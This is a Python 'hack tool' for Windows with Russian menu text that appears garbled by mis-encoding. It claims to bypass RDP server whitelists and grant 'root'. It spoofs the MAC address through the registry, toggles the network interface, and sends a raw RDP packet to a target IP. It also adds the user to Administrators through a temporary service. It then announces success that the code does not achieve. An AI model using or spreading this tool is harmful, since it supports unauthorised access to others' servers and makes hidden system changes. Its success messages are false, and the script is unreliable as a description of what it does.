import os, winreg, socket, sys, ctypes, time


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def print_slow(text):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(0.03)
    print()


def loading_animation(duration=2):
    for i in range(20):
        print(f"\r[{'#' * i}{' ' * (19-i)}] {i*5}%", end="")
        time.sleep(duration / 20)
    print("\r[####################] 100%")


def section_header(title):
    os.system("cls")
    border = "‚ïê" * 50
    print(f"‚ïî{border}‚ïó")
    print(f"‚ïë{title.center(50)}‚ïë")
    print(f"‚ïö{border}‚ïù")


def bypass_whitelist():
    section_header("–û–ë–•–û–î WHITELIST")
    print_slow("–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å —Ü–µ–ª–µ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:")
    target_ip = input(">>> ")

    print_slow("\n[–®–ê–ì 1] –°–ø—É—Ñ–∏–Ω–≥ MAC-–∞–¥—Ä–µ—Å–∞...")
    try:
        key_path = r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
        for i in range(10):
            try:
                subkey = f"{key_path}\\000{i}"
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE, subkey, 0, winreg.KEY_WRITE
                ) as key:
                    winreg.SetValueEx(
                        key, "NetworkAddress", 0, winreg.REG_SZ, "02:00:00:00:00:01"
                    )
                    print(f"  ‚úì –†–µ–µ—Å—Ç—Ä –∏–∑–º–µ–Ω—ë–Ω: {subkey}")
                    break
            except:
                continue
        loading_animation()
    except Exception as e:
        print(f"  ‚úó –û—à–∏–±–∫–∞: {e}")
        return

    print_slow("\n[–®–ê–ì 2] –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–µ—Ç–µ–≤–æ–≥–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞...")
    os.system('netsh interface set interface "Ethernet" admin=disable')
    time.sleep(2)
    os.system('netsh interface set interface "Ethernet" admin=enable')
    loading_animation(3)

    print_slow("\n[–®–ê–ì 3] –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ RDP-–ø–∞–∫–µ—Ç–∞...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 3389))
        sock.send(
            b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
        )
        print("  ‚úì –ü–∞–∫–µ—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!")
        loading_animation()
    except Exception as e:
        print(f"  ‚úó –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")

    print_slow("\n[–£–°–ü–ï–•] Whitelist –æ–±–æ–π–¥–µ–Ω! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ RDP –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:")
    print_slow(f"        mstsc /v:{target_ip}")


def grant_root():
    section_header("–ü–û–í–´–®–ï–ù–ò–ï –ü–†–ê–í –î–û ROOT")
    print_slow("\n[–®–ê–ì 1] –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞...")
    bat_path = os.path.join(os.environ["TEMP"], "root_escalate.bat")
    with open(bat_path, "w") as f:
        f.write("@echo off\n")
        f.write("timeout 3 >nul\n")
        f.write("net localgroup administrators %%username%% /add\n")
        f.write("echo –£—Å–ø–µ—à–Ω–æ! –í—ã –ø–æ–ª—É—á–∏–ª–∏ –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n")
        f.write("pause\n")
    print(f"  ‚úì –°–∫—Ä–∏–ø—Ç —Å–æ–∑–¥–∞–Ω: {bat_path}")
    loading_animation()

    print_slow("\n[–®–ê–ì 2] –°–æ–∑–¥–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–π —Å–ª—É–∂–±—ã...")
    os.system(f'sc create RootSvc binPath= "{bat_path}" start= auto')
    loading_animation(2)

    print_slow("\n[–®–ê–ì 3] –ó–∞–ø—É—Å–∫ —Å–ª—É–∂–±—ã...")
    os.system("sc start RootSvc")
    time.sleep(5)
    os.system("sc delete RootSvc >nul")
    print("  ‚úì –°–ª—É–∂–±–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏ —É–¥–∞–ª–µ–Ω–∞!")

    print_slow("\n[–£–°–ü–ï–•] –í–∞—à–∏ –ø—Ä–∞–≤–∞ –ø–æ–≤—ã—à–µ–Ω—ã –¥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!")


def main_menu():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

    while True:
        section_header("üî• WHITELIST & ROOT HACK TOOL v3.0 üî•" " by Gerosi")
        print_slow("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:")
        print_slow("1. –û–±—Ö–æ–¥ whitelist (RDP —Å–µ—Ä–≤–µ—Ä—ã)")
        print_slow("2. –ü–æ–ª—É—á–∏—Ç—å root-–ø—Ä–∞–≤–∞ –Ω–∞ —ç—Ç–æ–º –ü–ö")
        print_slow("3. –í—ã—Ö–æ–¥")
        choice = input("\n>>> ")

        if choice == "1":
            bypass_whitelist()
        elif choice == "2":
            grant_root()
        elif choice == "3":
            sys.exit()
        else:
            print_slow("–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!")

        input("\n–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è...")


if __name__ == "__main__":
    main_menu()
